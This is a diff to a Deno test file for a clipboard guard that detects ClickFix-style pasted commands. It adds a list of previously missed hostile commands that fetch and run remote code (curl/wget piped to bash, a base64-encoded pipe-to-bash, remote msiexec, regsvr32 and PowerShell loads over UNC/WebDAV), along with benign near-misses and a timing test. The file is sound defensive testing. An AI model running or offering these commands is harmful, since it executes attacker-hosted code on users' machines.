@@ -55,6 +55,58 @@ Deno.test("clipboard guard patterns: ClickFix-style commands match, ordinary sni
   for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
 });
 
+// Review 2026-11-16 WP-04: ClickFix forms the patterns missed
+// (docs/review-2026-11-16/repros/pat.mjs printed MISSED for each).
+const MISSED_2026_11_16 = [
+  "curl -fsSL https://203.0.113.5/a.sh | /bin/bash",
+  "curl -fsSL https://203.0.113.5/a.sh | nohup bash",
+  "wget -qO- https://203.0.113.5/a.sh | sudo -E /usr/bin/env bash",
+  "bash <(curl -fsSL https://203.0.113.5/a.sh)",
+  "/bin/bash -c \"$(echo Y3VybCBodHRwOi8vZXZpbC9hIHwgYmFzaA== | base64 -d)\"",
+  "cmd /c \"finger vke@203.0.113.5 | cmd\"",
+  "\\\\203.0.113.5@SSL\\DavWWWRoot\\verify.exe",
+  "\\\\203.0.113.5@SSL@443\\share\\verify.exe",
+  "msiexec /qn /i \\\\203.0.113.5@80\\a.msi",
+  "regsvr32 /s /n /u /i:\\\\203.0.113.5\\a.sct scrobj.dll",
+  "PoWeRsHeLl -ep bypass -f \\\\203.0.113.5\\s\\a.ps1",
+];
+const BENIGN_2026_11_16 = [
+  "cat file | bash-completion",
+  "\\\\fileserver\\share\\doc.pdf",
+  "curl -s https://api.example.test/v1/items | jq .",
+  "wget -qO- https://example.test/a.tar.gz | tar xz",
+  "curl -fsSL https://example.test/x | shasum -a 256",
+  "echo aGVsbG8= | base64 -d",
+  "finger user@example.test",
+  "msiexec /i setup.msi /qn",
+  "powershell -File .\\build.ps1",
+];
+
+Deno.test("clipboard guard patterns: the 2026-11-16 ClickFix forms match; near-miss ordinary commands do not", () => {
+  const g = loadClip();
+  const missed = MISSED_2026_11_16.filter((s) => !g.matchDangerous(s));
+  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
+  const fp = BENIGN_2026_11_16.filter((s) => g.matchDangerous(s));
+  assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
+  for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
+});
+
+Deno.test("clipboard guard patterns stay linear: 100 KB adversarial inputs are checked fast", () => {
+  const g = loadClip();
+  const size = 100 * 1024;
+  const fill = (unit) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
+  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "a", " ", "/"].map(fill);
+  // A generous limit: the machine is shared. A quadratic pattern takes
+  // seconds on these inputs.
+  const LIMIT_MS = 500;
+  for (const s of inputs) {
+    const t0 = performance.now();
+    g.matchDangerous(s);
+    const ms = performance.now() - t0;
+    assert(ms < LIMIT_MS, `${ms.toFixed(1)} ms for 100 KB of ${JSON.stringify(s.slice(0, 14))}`);
+  }
+});
+
 Deno.test("clipboard guard: docs hosts are safe; only the visitor's own copy of the selected text counts as deliberate", () => {
   const g = loadClip();
   for (const h of ["github.com", "docs.github.com", "developer.mozilla.org", "brew.sh"]) assert(g.onSafeHost(h), h);
